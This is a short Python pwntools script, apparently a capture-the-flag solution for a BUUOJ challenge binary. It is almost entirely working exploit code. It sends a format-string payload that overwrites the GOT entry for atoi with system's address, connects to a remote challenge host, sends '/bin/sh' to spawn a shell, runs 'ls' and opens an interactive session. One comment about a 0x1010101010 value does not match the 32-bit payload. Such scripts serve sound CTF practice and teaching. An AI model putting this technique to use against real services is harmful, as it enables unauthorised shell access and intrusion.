from pwn import *

elf = ELF('pwn')

#context.log_level = 'debug'

system_plt = elf.plt['system']
atoi_got = elf.got['atoi']

#format overflow
payload = p32(atoi_got) + b'%' + str(system_plt - 4).encode('utf-8') + b'c%10$n'
	
#now the value of word is 0x1010101010
#p = process('./pwn')
p = remote('node3.buuoj.cn', 28929)
p.recv()
p.sendline(payload);
p.recvuntil('\n')
p.sendline(b'/bin/sh')
p.sendline(b'ls')

p.interactive()
